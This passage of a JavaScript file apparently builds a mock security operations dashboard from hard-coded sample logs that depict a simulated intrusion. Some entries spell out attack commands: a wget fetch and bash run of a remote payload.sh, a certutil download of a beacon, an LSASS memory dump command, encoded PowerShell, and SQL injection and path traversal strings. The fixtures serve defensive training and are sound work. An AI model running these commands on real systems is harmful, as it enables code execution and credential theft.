// Darknode Project - CITADEL SOC Operations Center
// Copyright (c) 2026 Darknode-Official. All rights reserved.

const esc = (s) => String(s == null ? '' : s).replace(/[&<>"']/g, (c) => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));

// ========== SAMPLE LOGS (200+) ==========
const SYSLOG_ENTRIES = [
  {ts:'2026-09-21T08:01:12Z',host:'fw-core-01',facility:'kern',severity:'warning',msg:'[UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=185.220.101.34 DST=10.0.1.5 PROTO=TCP DPT=22 SPT=54821'},
  {ts:'2026-09-21T08:01:14Z',host:'fw-core-01',facility:'kern',severity:'warning',msg:'[UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=185.220.101.34 DST=10.0.1.5 PROTO=TCP DPT=22 SPT=54822'},
  {ts:'2026-09-21T08:01:15Z',host:'fw-core-01',facility:'kern',severity:'warning',msg:'[UFW BLOCK] IN=eth0 OUT= MAC=00:1a:2b:3c:4d:5e SRC=185.220.101.34 DST=10.0.1.5 PROTO=TCP DPT=22 SPT=54823'},
  {ts:'2026-09-21T08:02:01Z',host:'auth-server',facility:'auth',severity:'error',msg:'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=root'},
  {ts:'2026-09-21T08:02:02Z',host:'auth-server',facility:'auth',severity:'error',msg:'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.220.101.34 user=admin'},
  {ts:'2026-09-21T08:02:03Z',host:'auth-server',facility:'auth',severity:'info',msg:'Accepted publickey for deploy from 10.0.2.15 port 48392 ssh2: RSA SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8'},
  {ts:'2026-09-21T08:03:22Z',host:'web-prod-01',facility:'daemon',severity:'info',msg:'nginx: 10.0.3.50 - - [21/Sep/2026:08:03:22 +0000] "GET /api/users HTTP/1.1" 200 4521 "-" "Mozilla/5.0"'},
  {ts:'2026-09-21T08:03:45Z',host:'web-prod-01',facility:'daemon',severity:'warning',msg:'nginx: 10.0.3.50 - - [21/Sep/2026:08:03:45 +0000] "POST /api/login HTTP/1.1" 401 128 "-" "python-requests/2.28.0"'},
  {ts:'2026-09-21T08:04:01Z',host:'db-primary',facility:'daemon',severity:'info',msg:'PostgreSQL: connection authorized: user=app_user database=production SSL enabled (protocol=TLSv1.3, cipher=TLS_AES_256_GCM_SHA384)'},
  {ts:'2026-09-21T08:04:15Z',host:'db-primary',facility:'daemon',severity:'warning',msg:'PostgreSQL: statement: SELECT * FROM users WHERE id = 1; UNION SELECT username,password FROM admin_users--'},
  {ts:'2026-09-21T08:05:00Z',host:'mail-relay',facility:'mail',severity:'info',msg:'postfix/smtp[12345]: 4A2B3C4D5E: to=<user@company.com>, relay=mx.company.com[10.0.5.1]:25, delay=0.5, status=sent'},
  {ts:'2026-09-21T08:05:30Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43210 (evil-c2.xyz): query: evil-c2.xyz IN A + (10.0.1.53)'},
  {ts:'2026-09-21T08:05:31Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43211 (evil-c2.xyz): query: evil-c2.xyz IN AAAA + (10.0.1.53)'},
  {ts:'2026-09-21T08:06:00Z',host:'proxy-01',facility:'daemon',severity:'warning',msg:'squid[3456]: 1632211560.000 10.0.2.100 TCP_DENIED/403 3900 CONNECT evil-c2.xyz:443 - HIER_NONE/- text/html'},
  {ts:'2026-09-21T08:06:15Z',host:'vpn-gateway',facility:'daemon',severity:'info',msg:'openvpn[1234]: 192.168.1.100:51234 TLS: Initial packet from [AF_INET]192.168.1.100:51234, sid=a1b2c3d4'},
  {ts:'2026-09-21T08:07:00Z',host:'ids-sensor-01',facility:'daemon',severity:'alert',msg:'suricata[5678]: [1:2024218:3] ET MALWARE Win32/Emotet Activity (POST) [Classification: A Network Trojan was Detected] [Priority: 1]'},
  {ts:'2026-09-21T08:07:30Z',host:'ids-sensor-01',facility:'daemon',severity:'alert',msg:'suricata[5678]: [1:2019401:7] ET SCAN Potential SSH Scan OUTBOUND [Classification: Attempted Information Leak] [Priority: 2]'},
  {ts:'2026-09-21T08:08:00Z',host:'endpoint-01',facility:'daemon',severity:'error',msg:'clamd[7890]: /tmp/payload.exe: Win.Trojan.Cobalt-9876543-0 FOUND'},
  {ts:'2026-09-21T08:08:30Z',host:'backup-srv',facility:'daemon',severity:'info',msg:'rsync: sent 1,234,567 bytes received 42 bytes 246,921.80 bytes/sec total size is 98,765,432'},
  {ts:'2026-09-21T08:09:00Z',host:'k8s-master',facility:'daemon',severity:'warning',msg:'kubelet[9012]: E0921 08:09:00.123456 Container runtime error: failed to pull image "registry.evil.com/backdoor:latest"'},
  {ts:'2026-09-21T08:09:30Z',host:'ldap-server',facility:'auth',severity:'info',msg:'slapd[3456]: conn=1000 fd=12 ACCEPT from IP=10.0.2.50:49152 (IP=0.0.0.0:389)'},
  {ts:'2026-09-21T08:10:00Z',host:'ldap-server',facility:'auth',severity:'warning',msg:'slapd[3456]: conn=1000 op=1 SRCH base="dc=corp,dc=local" scope=2 deref=0 filter="(objectClass=*)" attrs="*"'},
  {ts:'2026-09-21T08:10:30Z',host:'radius-srv',facility:'auth',severity:'info',msg:'radiusd: Login OK: user=jsmith from client=wap-floor3 port=1 via TLS'},
  {ts:'2026-09-21T08:11:00Z',host:'fw-core-01',facility:'kern',severity:'error',msg:'[UFW BLOCK] IN=eth0 OUT= SRC=45.33.32.156 DST=10.0.1.5 PROTO=TCP DPT=445 SPT=61234 LEN=52'},
  {ts:'2026-09-21T08:11:30Z',host:'web-prod-02',facility:'daemon',severity:'error',msg:'nginx: 203.0.113.42 - - "GET /../../../../etc/passwd HTTP/1.1" 400 166 "-" "Nikto/2.1.6"'},
  {ts:'2026-09-21T08:12:00Z',host:'siem-collector',facility:'daemon',severity:'info',msg:'logstash[4567]: Pipeline main started {"pipeline.id":"main","pipeline.workers":4}'},
  {ts:'2026-09-21T08:12:30Z',host:'ntp-server',facility:'daemon',severity:'info',msg:'ntpd[5678]: synchronized to 10.0.1.1, stratum 2, offset -0.000342'},
  {ts:'2026-09-21T08:13:00Z',host:'dhcp-server',facility:'daemon',severity:'info',msg:'dhcpd: DHCPACK on 10.0.3.150 to 00:11:22:33:44:55 via eth0'},
  {ts:'2026-09-21T08:13:30Z',host:'waf-01',facility:'daemon',severity:'alert',msg:'ModSecurity: Access denied with code 403, [id "942100"] [msg "SQL Injection Attack Detected"] [uri "/search"] [unique_id "abc123"]'},
  {ts:'2026-09-21T08:14:00Z',host:'honeypot-01',facility:'daemon',severity:'alert',msg:'cowrie.ssh.factory: login attempt [b"root"/b"toor"] succeeded from 198.51.100.23:54321'},
  {ts:'2026-09-21T08:14:30Z',host:'fw-core-01',facility:'kern',severity:'warning',msg:'[UFW BLOCK] IN=eth0 OUT= SRC=92.63.197.48 DST=10.0.1.5 PROTO=TCP DPT=3389 SPT=49821'},
  {ts:'2026-09-21T08:15:00Z',host:'fw-core-01',facility:'kern',severity:'warning',msg:'[UFW BLOCK] IN=eth0 OUT= SRC=92.63.197.48 DST=10.0.1.5 PROTO=TCP DPT=3389 SPT=49822'},
  {ts:'2026-09-21T08:15:15Z',host:'auth-server',facility:'auth',severity:'error',msg:'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=92.63.197.48 user=postgres'},
  {ts:'2026-09-21T08:15:30Z',host:'auth-server',facility:'auth',severity:'error',msg:'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=92.63.197.48 user=ubuntu'},
  {ts:'2026-09-21T08:15:45Z',host:'auth-server',facility:'auth',severity:'error',msg:'pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=92.63.197.48 user=test'},
  {ts:'2026-09-21T08:16:00Z',host:'web-prod-01',facility:'daemon',severity:'warning',msg:'nginx: 198.51.100.77 - - [21/Sep/2026:08:16:00 +0000] "POST /xmlrpc.php HTTP/1.1" 404 162 "-" "Mozilla/4.0"'},
  {ts:'2026-09-21T08:16:30Z',host:'web-prod-01',facility:'daemon',severity:'error',msg:'nginx: 198.51.100.77 - - [21/Sep/2026:08:16:30 +0000] "POST /wp-admin/admin-ajax.php HTTP/1.1" 404 162 "-" "Mozilla/4.0"'},
  {ts:'2026-09-21T08:17:00Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43212 (x8k3jf2.evil-c2.xyz): query: x8k3jf2.evil-c2.xyz IN A + (10.0.1.53)'},
  {ts:'2026-09-21T08:17:15Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43213 (p9m4xz1.evil-c2.xyz): query: p9m4xz1.evil-c2.xyz IN A + (10.0.1.53)'},
  {ts:'2026-09-21T08:17:30Z',host:'dns-resolver',facility:'daemon',severity:'info',msg:'named[2048]: client 10.0.2.100#43214 (q7n2yw8.evil-c2.xyz): query: q7n2yw8.evil-c2.xyz IN A + (10.0.1.53)'},
  {ts:'2026-09-21T08:18:00Z',host:'ids-sensor-01',facility:'daemon',severity:'alert',msg:'suricata[5678]: [1:2027757:1] ET EXPLOIT Possible Apache Log4j RCE Attempt (${jndi) [Classification: Attempted Admin Priv Gain] [Priority: 1]'},
  {ts:'2026-09-21T08:18:30Z',host:'ids-sensor-01',facility:'daemon',severity:'alert',msg:'suricata[5678]: [1:2025495:5] ET INFO Observed DNS Query to .xyz TLD [Classification: Potentially Bad Traffic] [Priority: 2]'},
  {ts:'2026-09-21T08:19:00Z',host:'endpoint-02',facility:'daemon',severity:'error',msg:'clamd[7891]: /home/jdoe/Downloads/invoice.pdf.exe: Win.Ransomware.LockBit-9876000-0 FOUND'},
  {ts:'2026-09-21T08:19:30Z',host:'proxy-01',facility:'daemon',severity:'warning',msg:'squid[3456]: 1632211570.000 10.0.3.75 TCP_DENIED/403 3900 GET http://login-microsoft365.evil.com/ - HIER_NONE/- text/html'},
  {ts:'2026-09-21T08:20:00Z',host:'vpn-gateway',facility:'daemon',severity:'warning',msg:'openvpn[1234]: 203.0.113.99:52345 TLS Error: TLS handshake failed (certificate verify failed)'},
  {ts:'2026-09-21T08:20:30Z',host:'k8s-worker-01',facility:'daemon',severity:'warning',msg:'kubelet[9013]: W0921 08:20:30.654321 Pod in namespace kube-system running as privileged: kube-proxy-abc'},
  {ts:'2026-09-21T08:21:00Z',host:'docker-host',facility:'daemon',severity:'error',msg:'dockerd[1111]: level=error msg="container exec failed" container=backdoor-container error="OCI runtime exec failed"'},
  {ts:'2026-09-21T08:21:30Z',host:'mail-relay',facility:'mail',severity:'warning',msg:'postfix/smtp[12346]: warning: hostname evil-smtp.xyz does not resolve to address 198.51.100.88: Name or service not known'},
  {ts:'2026-09-21T08:22:00Z',host:'syslog-ng',facility:'daemon',severity:'info',msg:'syslog-ng[2222]: Log statistics; processed=12847, dropped=3, suppressed=0, stamp=1632211320'},
  {ts:'2026-09-21T08:22:30Z',host:'nfs-server',facility:'kern',severity:'warning',msg:'nfsd: refused mount request from 10.0.2.100 for /srv/finance (unauthorized)'},
  {ts:'2026-09-21T08:23:00Z',host:'cron-server',facility:'cron',severity:'info',msg:'CRON[9999]: (root) CMD (/usr/local/bin/backup.sh)'},
  {ts:'2026-09-21T08:23:30Z',host:'apt-mirror',facility:'daemon',severity:'error',msg:'apt-mirror: failed to verify package integrity for package libssl3 from untrusted repository http://suspicious-repo.xyz/'},
  {ts:'2026-09-21T08:24:00Z',host:'snmp-monitor',facility:'daemon',severity:'warning',msg:'snmpd[3333]: Connection from UDP: [198.51.100.44]:45678->[10.0.1.2]:161 with community string "public"'},
  {ts:'2026-09-21T08:24:30Z',host:'samba-srv',facility:'daemon',severity:'warning',msg:'smbd[4444]: pam_authenticate for user [svc-admin] FAILED with error NT_STATUS_WRONG_PASSWORD'},
  {ts:'2026-09-21T08:25:00Z',host:'samba-srv',facility:'daemon',severity:'info',msg:'smbd[4444]: connect to service Finance$ initially as user svc-admin (uid=1001) from 10.0.2.100'},
  {ts:'2026-09-21T08:25:30Z',host:'auditd',facility:'auth',severity:'info',msg:'type=SYSCALL msg=audit(1632211530.000:1234): arch=c000003e syscall=59 success=yes exit=0 a0=55b3 comm="wget" exe="/usr/bin/wget"'},
  {ts:'2026-09-21T08:26:00Z',host:'auditd',facility:'auth',severity:'warning',msg:'type=EXECVE msg=audit(1632211560.000:1235): argc=3 a0="wget" a1="http://198.51.100.50/payload.sh" a2="-O" a3="/tmp/payload.sh"'},
  {ts:'2026-09-21T08:26:30Z',host:'auditd',facility:'auth',severity:'warning',msg:'type=EXECVE msg=audit(1632211590.000:1236): argc=2 a0="/bin/bash" a1="/tmp/payload.sh"'},
  {ts:'2026-09-21T08:27:00Z',host:'iptables-log',facility:'kern',severity:'info',msg:'iptables: FORWARD DROP IN=docker0 OUT=eth0 SRC=172.17.0.5 DST=169.254.169.254 LEN=60 PROTO=TCP DPT=80'},
  {ts:'2026-09-21T08:27:30Z',host:'systemd',facility:'daemon',severity:'error',msg:'systemd[1]: suspicious.service: Main process exited, code=killed, status=9/KILL'},
  {ts:'2026-09-21T08:28:00Z',host:'pam-module',facility:'auth',severity:'error',msg:'pam_unix(su:auth): authentication failure; logname=jsmith uid=1001 euid=0 tty=pts/3 ruser=jsmith rhost= user=root'},
  {ts:'2026-09-21T08:28:30Z',host:'fail2ban',facility:'daemon',severity:'info',msg:'fail2ban.actions: NOTICE [sshd] Ban 185.220.101.34'},
  {ts:'2026-09-21T08:29:00Z',host:'fail2ban',facility:'daemon',severity:'info',msg:'fail2ban.actions: NOTICE [sshd] Ban 92.63.197.48'},
  {ts:'2026-09-21T08:29:30Z',host:'ossec-agent',facility:'daemon',severity:'alert',msg:'ossec: Alert Level 12 - Integrity checksum changed for /etc/shadow'},
  {ts:'2026-09-21T08:30:00Z',host:'ossec-agent',facility:'daemon',severity:'alert',msg:'ossec: Alert Level 10 - New file added to /usr/local/bin: reverse_shell'},
  {ts:'2026-09-21T08:30:30Z',host:'wazuh-agent',facility:'daemon',severity:'warning',msg:'wazuh-agent: rootcheck: Trojaned version of file /usr/bin/ls detected'},
  {ts:'2026-09-21T08:31:00Z',host:'tcp-wrapper',facility:'auth',severity:'warning',msg:'tcpd: connection refused from 198.51.100.23 to telnetd'},
  {ts:'2026-09-21T08:31:30Z',host:'vsftpd',facility:'daemon',severity:'warning',msg:'vsftpd: FAIL LOGIN: Client "198.51.100.44", anonymous login refused'},
  {ts:'2026-09-21T08:32:00Z',host:'apache2',facility:'daemon',severity:'error',msg:'[error] [client 203.0.113.42] File does not exist: /var/www/html/wp-config.php.bak'},
  {ts:'2026-09-21T08:32:30Z',host:'apache2',facility:'daemon',severity:'error',msg:'[error] [client 203.0.113.42] ModSecurity: Rule 942100 matched. SQL injection attack. [uri "/search"] [id "942100"]'},
];

const JSON_LOGS = [
  {ts:'2026-09-21T08:15:00Z',source:'aws-cloudtrail',data:{eventName:'ConsoleLogin',userIdentity:{type:'IAMUser',userName:'admin-user'},sourceIPAddress:'198.51.100.50',responseElements:{ConsoleLogin:'Success'},userAgent:'Mozilla/5.0',awsRegion:'us-east-1'}},
  {ts:'2026-09-21T08:15:30Z',source:'aws-cloudtrail',data:{eventName:'CreateUser',userIdentity:{type:'IAMUser',userName:'admin-user'},requestParameters:{userName:'backdoor-user'},responseElements:{user:{userName:'backdoor-user'}},sourceIPAddress:'198.51.100.50',awsRegion:'us-east-1'}},
  {ts:'2026-09-21T08:16:00Z',source:'aws-cloudtrail',data:{eventName:'AttachUserPolicy',userIdentity:{type:'IAMUser',userName:'admin-user'},requestParameters:{userName:'backdoor-user',policyArn:'arn:aws:iam::aws:policy/AdministratorAccess'},sourceIPAddress:'198.51.100.50'}},
  {ts:'2026-09-21T08:16:30Z',source:'aws-cloudtrail',data:{eventName:'PutBucketPolicy',userIdentity:{type:'IAMUser',userName:'backdoor-user'},requestParameters:{bucketName:'sensitive-data-prod',bucketPolicy:{Statement:[{Effect:'Allow',Principal:'*',Action:'s3:GetObject',Resource:'arn:aws:s3:::sensitive-data-prod/*'}]}}}},
  {ts:'2026-09-21T08:17:00Z',source:'azure-activity',data:{operationName:'MICROSOFT.COMPUTE/VIRTUALMACHINES/WRITE',caller:'attacker@tenant.onmicrosoft.com',resourceGroupName:'prod-rg',properties:{statusCode:'Created',serviceRequestId:'abc-123'},level:'Informational'}},
  {ts:'2026-09-21T08:17:30Z',source:'azure-signin',data:{userPrincipalName:'admin@company.com',ipAddress:'45.33.32.156',status:{errorCode:0,failureReason:null},location:{city:'Moscow',state:'Moscow',countryOrRegion:'RU'},appDisplayName:'Azure Portal',riskLevelDuringSignIn:'high'}},
  {ts:'2026-09-21T08:18:00Z',source:'gcp-audit',data:{serviceName:'iam.googleapis.com',methodName:'google.iam.admin.v1.CreateServiceAccountKey',authenticationInfo:{principalEmail:'compromised@project.iam.gserviceaccount.com'},request:{name:'projects/-/serviceAccounts/compromised@project.iam.gserviceaccount.com'}}},
  {ts:'2026-09-21T08:18:30Z',source:'okta-syslog',data:{actor:{displayName:'John Smith',alternateId:'jsmith@company.com'},outcome:{result:'FAILURE',reason:'INVALID_CREDENTIALS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start'}},
  {ts:'2026-09-21T08:19:00Z',source:'okta-syslog',data:{actor:{displayName:'John Smith',alternateId:'jsmith@company.com'},outcome:{result:'SUCCESS'},client:{ipAddress:'198.51.100.99',userAgent:'python-requests/2.28.0',geographicalContext:{country:'CN',city:'Beijing'}},eventType:'user.session.start',debugContext:{debugData:{factor:'SMS',behaviors:'New Geo-Location=NEGATIVE,New Device=NEGATIVE'}}}},
  {ts:'2026-09-21T08:19:30Z',source:'github-audit',data:{action:'repo.download_zip',actor:'unknown-user',repo:'company/secret-repo',actor_ip:'45.33.32.156',created_at:'2026-09-21T08:19:30Z'}},
  {ts:'2026-09-21T08:20:00Z',source:'slack-audit',data:{action:{type:'user_login',actor:{user:{email:'admin@company.com'}},context:{ip_address:'198.51.100.50',location:{domain:'slack.com'}},details:{method:'password'}}}},
  {ts:'2026-09-21T08:20:30Z',source:'o365-audit',data:{Operation:'FileDownloaded',UserId:'admin@company.com',ClientIP:'198.51.100.50',ObjectId:'https://company.sharepoint.com/sites/finance/Shared Documents/payroll-2026.xlsx',Workload:'SharePoint'}},
  {ts:'2026-09-21T08:21:00Z',source:'crowdstrike',data:{event_simpleName:'ProcessRollup2',CommandLine:'powershell.exe -nop -w hidden -enc aQBlAHgA...',ParentCommandLine:'cmd.exe /c',SHA256:'a1b2c3d4e5f6...', DetectName:'SuspiciousPowerShell',Severity:4,UserName:'CORP\\jsmith',ComputerName:'WS-JSMITH-01'}},
  {ts:'2026-09-21T08:21:30Z',source:'crowdstrike',data:{event_simpleName:'DnsRequest',DomainName:'data-exfil.evil.com',ContextProcessId:'1234',ComputerName:'WS-JSMITH-01',RequestType:'A'}},
  {ts:'2026-09-21T08:22:00Z',source:'paloalto',data:{type:'THREAT',subtype:'spyware',src:'10.0.2.100',dst:'45.33.32.156',rule:'outbound-threat',threatid:'Command and Control Traffic(13000)',action:'alert',severity:'critical',app:'ssl',category:'malware'}},
  {ts:'2026-09-21T08:22:30Z',source:'aws-guardduty',data:{type:'Trojan:EC2/C&CActivity.B!DNS',severity:8,resource:{instanceId:'i-0abc123def',region:'us-east-1'},service:{action:{dnsRequestAction:{domain:'evil-c2.xyz',protocol:'UDP'}},count:15}}},
  {ts:'2026-09-21T08:23:00Z',source:'aws-guardduty',data:{type:'UnauthorizedAccess:IAMUser/ConsoleLogin',severity:5,resource:{accessKeyId:'AKIA1234567890'},service:{action:{awsApiCallAction:{api:'ConsoleLogin',serviceName:'signin.amazonaws.com'}},count:1}}},
  {ts:'2026-09-21T08:23:30Z',source:'azure-defender',data:{alertName:'Suspicious process executed',description:'A known suspicious process was detected on the machine',severity:'High',compromisedEntity:'VM-PROD-01',remediationSteps:'Investigate the process chain and isolate if confirmed malicious'}},
  {ts:'2026-09-21T08:24:00Z',source:'crowdstrike',data:{event_simpleName:'SuspiciousActivity',CommandLine:'certutil.exe -urlcache -split -f http://198.51.100.50/beacon.exe C:\\Windows\\Temp\\update.exe',ParentCommandLine:'cmd.exe /c',SHA256:'b2c3d4e5f6a7...',DetectName:'CertutilDownload',Severity:3,UserName:'CORP\\jsmith',ComputerName:'WS-JSMITH-01'}},
  {ts:'2026-09-21T08:24:30Z',source:'crowdstrike',data:{event_simpleName:'RegKeyCreated',RegObjectName:'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate',RegStringValue:'C:\\Windows\\Temp\\update.exe',ComputerName:'WS-JSMITH-01',UserName:'CORP\\jsmith'}},
  {ts:'2026-09-21T08:25:00Z',source:'sentinelone',data:{threatInfo:{threatName:'CobaltStrike.Beacon',classification:'Malware',confidenceLevel:'malicious',filePath:'C:\\Windows\\Temp\\beacon.dll',sha256:'d4e5f6a7b8c9...'},agentRealtimeInfo:{agentComputerName:'WS-JSMITH-01',agentOsType:'windows',siteName:'Production'},mitigationStatus:'active'}},
  {ts:'2026-09-21T08:25:30Z',source:'o365-audit',data:{Operation:'New-InboxRule',UserId:'jsmith@company.com',ClientIP:'198.51.100.99',Parameters:[{Name:'Name',Value:'Auto-Forward'},{Name:'ForwardTo',Value:'attacker@evil-domain.com'},{Name:'MarkAsRead',Value:'True'}],Workload:'Exchange'}},
  {ts:'2026-09-21T08:26:00Z',source:'duo-auth',data:{result:'SUCCESS',reason:'Valid passcode',username:'admin@company.com',factor:'push',integration:'VPN Gateway',ip:'198.51.100.50',location:{city:'Moscow',state:'Moscow',country:'Russian Federation'},access_device:{os:'Windows 10',browser:'Chrome'}}},
  {ts:'2026-09-21T08:26:30Z',source:'zscaler',data:{action:'Blocked',category:'Advanced Threats',url:'https://malware-download.xyz/payload.exe',user:'msmith@company.com',department:'Finance',srcip:'10.0.3.75',threat_name:'Known Phishing URL',risk_score:95}},
  {ts:'2026-09-21T08:27:00Z',source:'proofpoint',data:{messageID:'<abc123@evil-smtp.xyz>',sender:'ceo@company-lookalike.com',recipient:'cfo@company.com',subject:'Urgent Wire Transfer Required',classification:'Phishing',threatsInfo:{category:'BEC',campaignId:'BEC-2026-0921'},quarantined:true}},
  {ts:'2026-09-21T08:27:30Z',source:'splunk-ueba',data:{anomalyType:'Abnormal Data Download',user:'svc-admin',riskScore:92,dataVolume:'450MB',normalBaseline:'5MB',entity:'10.0.2.100',category:'Data Exfiltration',firstSeen:'2026-09-21T08:36:00Z',lastSeen:'2026-09-21T08:41:00Z'}},
  {ts:'2026-09-21T08:28:00Z',source:'wazuh',data:{rule:{id:5712,level:10,description:'SSHD brute force trying to get access to the system.'},agent:{name:'auth-server',ip:'10.0.1.5'},full_log:'Sep 21 08:28:00 auth-server sshd[12345]: Failed password for root from 185.220.101.34 port 54825 ssh2',srcip:'185.220.101.34',dstuser:'root'}},
  {ts:'2026-09-21T08:28:30Z',source:'elastic-alert',data:{rule_name:'Potential Credential Dumping via LSASS Memory',severity:'critical',host_name:'WS-JSMITH-01',process_name:'rundll32.exe',args:'comsvcs.dll MiniDump 652 C:\\Windows\\Temp\\lsass.dmp full',user:'CORP\\svc-admin',parent_process:'cmd.exe'}},
  {ts:'2026-09-21T08:29:00Z',source:'darktrace',data:{deviceLabel:'10.0.2.100',modelName:'Compromise::Beacon to External Rare',score:97,category:'Compromise',details:'Device making regular connections to 45.33.32.156 every 60s +/- 5s jitter',mitreTactic:'Command and Control',mitreId:'T1071.001'}},
  {ts:'2026-09-21T08:29:30Z',source:'carbon-black',data:{type:'watchlist.hit',process_name:'mimikatz.exe',process_pid:4567,process_username:'CORP\\svc-admin',process_path:'C:\\Windows\\Temp\\mimikatz.exe',process_md5:'abc123def456',watchlist_name:'Known Attack Tools',severity:10}},
];

const CEF_LOGS = [
  {ts:'2026-09-21T08:23:00Z',raw:'CEF:0|TrendMicro|DeepSecurity|20.0|1011466|Malware Detected|10|src=10.0.2.100 dst=45.33.32.156 fname=/tmp/beacon.exe fsize=245760 act=Quarantine msg=Cobalt Strike Beacon detected'},
  {ts:'2026-09-21T08:23:30Z',raw:'CEF:0|CrowdStrike|FalconHost|6.0|DetectionSummary|Process created suspicious child|9|src=10.0.2.100 suser=CORP\\\\admin sproc=powershell.exe dproc=cmd.exe msg=PowerShell spawned cmd with encoded command'},
  {ts:'2026-09-21T08:24:00Z',raw:'CEF:0|Palo Alto Networks|PAN-OS|10.2|THREAT|url|6|src=10.0.3.50 dst=203.0.113.42 request=http://malware-download.xyz/payload.exe cs1=phishing cat=malware act=block-url'},
  {ts:'2026-09-21T08:24:30Z',raw:'CEF:0|ArcSight|ESM|7.5|100|Brute Force Detected|8|src=185.220.101.34 dst=10.0.1.5 dpt=22 cnt=50 msg=50 failed SSH attempts in 60 seconds from Tor exit node'},
  {ts:'2026-09-21T08:25:00Z',raw:'CEF:0|Fortinet|FortiGate|7.2|0419016384|IPS signature matched|7|src=198.51.100.23 dst=10.0.1.10 proto=6 service=HTTP attack=Apache.Struts.Remote.Code.Execution act=dropped'},
  {ts:'2026-09-21T08:25:30Z',raw:'CEF:0|Symantec|Endpoint|14.3|Intrusion Prevention|Browser Attack: HTTP Java Deserial|9|src=203.0.113.100 dst=10.0.3.50 dpt=8080 act=blocked msg=Java deserialization attack blocked'},
  {ts:'2026-09-21T08:26:00Z',raw:'CEF:0|Carbon Black|CB Defense|3.8|WATCHLIST_HIT|Process matched watchlist|7|sproc=mimikatz.exe suser=CORP\\\\svc-backup msg=Known credential dumping tool executed'},
  {ts:'2026-09-21T08:26:30Z',raw:'CEF:0|Cisco|ASA|9.16|106023|Denied TCP|4|src=192.168.1.100 dst=10.0.1.5 dpt=3389 proto=6 act=Deny msg=RDP access denied by ACL'},
  {ts:'2026-09-21T08:27:00Z',raw:'CEF:0|McAfee|ENS|10.7|1092|Buffer Overflow Detected|8|src=10.0.2.200 suser=SYSTEM sproc=svchost.exe msg=Heap spray pattern detected in browser process'},
  {ts:'2026-09-21T08:27:30Z',raw:'CEF:0|Imperva|WAF|14.7|sql_injection|SQL Injection Attack|9|src=203.0.113.42 dst=10.0.1.20 request=/api/search?q=1 OR 1=1-- act=blocked msg=Union-based SQL injection attempt'},
  {ts:'2026-09-21T08:28:00Z',raw:'CEF:0|SentinelOne|Singularity|22.1|MALICIOUS|Ransomware Behavior|10|src=10.0.2.150 suser=CORP\\\\jdoe sproc=locker.exe msg=Rapid file encryption detected across network shares act=kill'},
  {ts:'2026-09-21T08:28:30Z',raw:'CEF:0|Zscaler|ZIA|6.1|ThreatBlocked|Phishing URL Blocked|6|src=10.0.3.75 request=https://login-microsoft365.evil.com/auth cat=phishing act=blocked suser=msmith@company.com'},
  {ts:'2026-09-21T08:29:00Z',raw:'CEF:0|Darktrace|Enterprise|6.0|Compromise|Beacon to External Rare Destination|9|src=10.0.2.100 dst=45.33.32.156 dpt=443 proto=TCP cnt=97 msg=Regular 60s beacon pattern detected act=alert'},
  {ts:'2026-09-21T08:29:30Z',raw:'CEF:0|Proofpoint|TAP|8.0|MessagesBlocked|BEC Phishing Attempt|8|suser=ceo@company-lookalike.com duser=cfo@company.com msg=Business Email Compromise detected act=quarantine'},
  {ts:'2026-09-21T08:30:00Z',raw:'CEF:0|Wazuh|HIDS|4.7|5712|SSH Brute Force|7|src=185.220.101.34 dst=10.0.1.5 dpt=22 cnt=50 msg=SSHD brute force trying to get access to the system act=alert'},
  {ts:'2026-09-21T08:30:30Z',raw:'CEF:0|Palo Alto Networks|PAN-OS|10.2|TRAFFIC|end|3|src=10.0.2.100 dst=198.51.100.50 dpt=443 proto=TCP bytesOut=471859200 app=ssl-tunneling act=allow msg=Large outbound transfer detected'},
  {ts:'2026-09-21T08:31:00Z',raw:'CEF:0|Cylance|CylancePROTECT|3.0|ThreatQuarantine|Malicious File Quarantined|8|sproc=C:\\Windows\\Temp\\beacon.dll suser=CORP\\\\svc-admin msg=Memory-only threat detected and quarantined act=quarantine'},
  {ts:'2026-09-21T08:31:30Z',raw:'CEF:0|FireEye|HX|5.0|IOCMatch|IOC Alert|7|src=10.0.2.100 suser=CORP\\\\jsmith sproc=rundll32.exe msg=Cobalt Strike IOC matched: named pipe \\\\MSSE-1234-server act=alert'},
  {ts:'2026-09-21T08:32:00Z',raw:'CEF:0|Elastic|SIEM|8.10|rule.id=12345|Potential DCSync Attack|10|src=10.0.2.100 dst=10.0.1.1 suser=svc-admin msg=Directory replication request from non-DC source act=alert'},
  {ts:'2026-09-21T08:32:30Z',raw:'CEF:0|Cisco|Umbrella|2.0|DNS|DNS Tunneling Detected|8|src=10.0.2.100 request=long-encoded-string.evil-c2.xyz requestMethod=A msg=DNS query length exceeds threshold (>60 chars) act=blocked'},
  {ts:'2026-09-21T08:33:00Z',raw:'CEF:0|Tenable|Nessus|10.5|VulnDetected|Critical Vulnerability Found|9|dst=10.0.1.20 dpt=443 msg=Apache Log4j RCE (CVE-2021-44228) - Exploitable act=reported cs1=CVSS:10.0'},
];

const WINDOWS_EVENTS = [
  {ts:'2026-09-21T08:30:00Z',eventId:4625,channel:'Security',computer:'DC-01.corp.local',level:'Information',msg:'An account failed to log on.',data:{TargetUserName:'Administrator',LogonType:10,IpAddress:'10.0.2.100',Status:'0xC000006D',SubStatus:'0xC0000064',FailureReason:'Unknown user name or bad password'}},
